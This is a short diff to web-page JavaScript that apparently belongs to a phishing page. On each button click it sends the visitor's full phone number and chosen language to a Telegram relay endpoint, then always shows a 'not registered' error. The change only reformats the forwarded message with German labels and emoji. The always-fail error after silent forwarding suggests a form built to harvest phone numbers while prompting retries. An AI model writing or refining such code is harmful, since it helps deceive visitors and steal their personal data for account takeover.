@@ -348,12 +348,14 @@ nextBtn.addEventListener("click", async () => {
   const fullPhone = LANGS[current].dial + digits;
 
   await fetch("/api/telegram", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({
-    message: `Phone: ${fullPhone} | Lang: ${current}`
-  })
-});
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      message:
+        `📱 Telefonnummer:\n${fullPhone}\n\n` +
+        `🌐 Sprache:\n${current}`
+    })
+  });
 
   triedSubmit = true;
   setError(true, LANGS[current].notRegistered);
